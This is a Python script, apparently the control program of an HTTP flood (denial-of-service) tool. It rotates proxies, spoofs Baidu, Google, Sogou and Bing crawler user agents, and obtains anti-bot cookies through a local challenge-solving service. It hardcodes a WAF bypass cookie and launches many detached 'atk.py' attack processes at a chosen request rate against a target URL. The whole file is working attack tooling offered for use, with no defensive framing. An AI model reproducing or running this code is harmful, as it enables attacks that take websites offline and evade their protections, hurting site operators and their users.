# -*- coding: utf-8 -*-
import os
import subprocess
import sys
import random
from requests.cookies import RequestsCookieJar
import requests
import json
import multiprocessing

jar = RequestsCookieJar()

config = {}

config['proxies'] = open('proxy.txt').read().split("\n")
UA = [
	"Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)",  # 百度蜘蛛抓取欺骗
	"Mozilla/5.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)",  # 谷歌蜘蛛抓取欺骗
	"Sogou web spider/4.0( http://www.sogou.com/docs/help/webmasters.htm#07)",  # 搜狗蜘蛛抓取欺骗
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.0.11) Gecko/20070312 Firefox/1.5.0.11; 360Spider",
	# 奇虎蜘蛛抓取欺骗
	"Mozilla/5.0 (compatible; bingbot/2.0 http://www.bing.com/bingbot.htm)",
]


def builder(inputfile, outfile, target):
	for line in open(inputfile):
		line = line.strip()
		ok = "s1c6e0931=k3q9pdi6nrievomhg1d3kmqf20; antscdn_waf_cookie5=3843296" + '---' + line + '---' + random.choice(UA) + '---' + target
		with open(outfile, 'a+', encoding="utf-8") as f:
			f.write(ok + "\n")


def attack_test(target):
	url = 'http://localhost:8191/v1'
	proxy_ip = random.choice(config['proxies'])
	headers = {
		'Content-Type': 'application/json',
	}
	data = {
		"cmd": "request.get",
		"url": target,
		"returnOnlyCookies": True,
		"proxy": {"url": f"http://{proxy_ip}"},
		"maxTimeout": 120000,
	}
	session = requests.session()
	rep = session.post(url=url, data=json.dumps(data), headers=headers).json()
	if rep['status'] == "ok":
		if not rep['solution']['cookies']:  # cookies不能等于空
			print('[*] Failed to get cookie[]', proxy_ip, rep['solution'])
		else:
			for i in rep['solution']['cookies']:
				jar.set(i['name'], i['value'])
				ua = rep['solution']['userAgent']
				if ua is None or ua == "NULL":
					ua = 'Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0'
				for c in jar:
					cookie = c.name + '=' + c.value + '; '
				print("[*]cookie: ", cookie, ua)
			headers = {
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
				"Accept-Encoding": "gzip, deflate, br",
				"Accept-Language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja;q=0.6",
				"Cache-Control": "max-age=0",
				"upgrade-insecure-requests": "1",
				"user-agent": ua,
			}
			daili = {"http": proxy_ip, "https": proxy_ip}
			session.cookies = jar
			test_1 = int(input('[*] input test num:').strip())
			r = session.get(url=target, proxies=daili, headers=headers).status_code
			code = int(input(f'[*] target status_code: {r}'))
			for i in range(test_1):

				r = session.get(url=target, proxies=daili, headers=headers)
				print("[*] host_status : ", r.status_code)
				if r.status_code == code:
					print(f'[*] test num:{i} status_code: {r.status_code} proxy: {proxy_ip} attack_url: {target}')
				else:
					print(['[*] ERROR requests num: ', i, r.status_code])
					break


def send_atk(method, target, cookie_file, qps):
	os.system(f"screen -dm python3 atk.py {method} {target} {cookie_file} {qps}")
	print('[*] start..')


def main():
	pool = multiprocessing.Pool(processes=100)
	if len(sys.argv) <= 1:
		print(f"user@am_root:~# python3 {sys.argv[0]} <cookie> <input_file> <out_file> <target>\n"
		      f"user@am_root:~# python3 {sys.argv[0]} <attack_test> <test_target>\n"
		      f"user@am_root:~# python3 {sys.argv[0]} <send_attack> <methods> <target> <cookie_file> <QPS> <process>")
		sys.exit()

	if sys.argv[1] == 'cookie':
		builder(sys.argv[2], sys.argv[3], sys.argv[4])
		print(f'[*] out_name: {sys.argv[3]}')
	elif sys.argv[1] == 'attack_test':
		attack_test(sys.argv[2])
	elif sys.argv[1] == 'send_attack':
		process = int(sys.argv[6])
		for _ in range(process):
			send_atk(sys.argv[2], sys.argv[3], sys.argv[4], sys.argv[5])
			print(f'start{_}')

	else:
		print('[*] methods error')


if __name__ == '__main__':
	main()

